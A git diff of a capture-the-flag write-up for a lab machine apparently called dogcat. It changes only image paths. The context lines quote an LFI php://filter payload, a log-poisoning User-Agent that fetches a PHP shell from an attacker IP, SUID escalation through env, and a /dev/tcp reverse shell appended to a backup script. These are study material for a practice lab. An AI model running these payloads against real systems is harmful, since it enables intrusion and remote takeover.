@@ -38,11 +38,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Let's visit the web application:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326111953.png)
+![](cybersecurity/images/Pasted%2520image%252020250326111953.png)
 
 If we click on any of them, we can see this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326112012.png)
+![](cybersecurity/images/Pasted%2520image%252020250326112012.png)
 
 We can view that the url is:
 
@@ -53,11 +53,11 @@ http://IP/?view=dog
 This view parameter could be vulnerable to LFI, let's try to visualize a resource that may not exist:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326112145.png)
+![](cybersecurity/images/Pasted%2520image%252020250326112145.png)
 
 If we try anything else, this happens:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326113812.png)
+![](cybersecurity/images/Pasted%2520image%252020250326113812.png)
 
 
 
@@ -70,7 +70,7 @@ php://filter/convert.base64-encode/resource=dog/../../../../var/www/html/index
 
 If we submit the request:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326114737.png)
+![](cybersecurity/images/Pasted%2520image%252020250326114737.png)
 
 There we go, we got LFI, let's proceed to exploitation.
 
@@ -125,7 +125,7 @@ From this, we got some valuable stuff, for example, it tries to set the extensio
 php://filter/convert.base64-encode/resource=./dog/../../../../etc/passwd&ext
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326120715.png)
+![](cybersecurity/images/Pasted%2520image%252020250326120715.png)
 
 It worked, let's read the contents:
 
@@ -166,7 +166,7 @@ Let's perform the RCE, we can upload a reverse shell to speed up the process, le
 In this way, we can see the log:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326124107.png)
+![](cybersecurity/images/Pasted%2520image%252020250326124107.png)
 
 Now, with this, we can perform log poisoning, let's send the request to our proxy and start a python server to get our `shell.php` file, for this, we need to use the following `User-Agent`:
 
@@ -174,11 +174,11 @@ Now, with this, we can perform log poisoning, let's send the request to our prox
 <?php file_put_contents('shell.php', file_get_contents('http://10.6.34.159:8000/shell.php')); ?>
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326124815.png)
+![](cybersecurity/images/Pasted%2520image%252020250326124815.png)
 
 Now, let's send the request and refresh the page, we can see in our python server that the file has been indeed downloaded:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326124827.png)
+![](cybersecurity/images/Pasted%2520image%252020250326124827.png)
 
 We can now simply set up the listener and access the following URL:
 
@@ -188,7 +188,7 @@ http://IP/shell.php
 
 And we can see this in our listener
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326124927.png)
+![](cybersecurity/images/Pasted%2520image%252020250326124927.png)
 
 We got a shell, let's proceed to privesc.
 
@@ -208,11 +208,11 @@ First step would be getting an stable shell:
 5. export TERM=xterm
 6. export BASH=bash
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326125041.png)
+![](cybersecurity/images/Pasted%2520image%252020250326125041.png)
 
 If we check `/`, we can see this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326125149.png)
+![](cybersecurity/images/Pasted%2520image%252020250326125149.png)
 
 Seems like we are inside of a docker container, let's test:
 
@@ -252,7 +252,7 @@ find / -perm -4000 2>/dev/null
 
 We got something `env`, let's check it on `gtfobins`:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326125537.png)
+![](cybersecurity/images/Pasted%2520image%252020250326125537.png)
 
 We can do the following to get root in the docker container:
 
@@ -260,7 +260,7 @@ We can do the following to get root in the docker container:
 /usr/bin/env /bin/bash -p
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326125619.png)
+![](cybersecurity/images/Pasted%2520image%252020250326125619.png)
 
 Since we got root we can read some flags, let's start reading them:
 
@@ -302,11 +302,11 @@ curl http://10.6.34.159:8000/nmap -o nmap
 
 If we try scanning the network it does not seem to work, this is not the intended path:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326130533.png)
+![](cybersecurity/images/Pasted%2520image%252020250326130533.png)
 
 Let's use linpeas then, we must be missing something:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326131049.png)
+![](cybersecurity/images/Pasted%2520image%252020250326131049.png)
 
 In the backup files, we can see this, there seems to be a `backup.sh` script, let's read it:
 
@@ -330,7 +330,7 @@ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.6.34.159/9001 0>&1" &' >> backup
 
 Set up a new listener, after little time, this happens in our listener:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326132008.png)
+![](cybersecurity/images/Pasted%2520image%252020250326132008.png)
 
 There we go, we got our root shell, escaping successfully the docker container, let's read final flag:
 
@@ -339,5 +339,5 @@ root@dogcat:~# cat flag4.txt
 THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250326132106.png)
+![](cybersecurity/images/Pasted%2520image%252020250326132106.png)
 
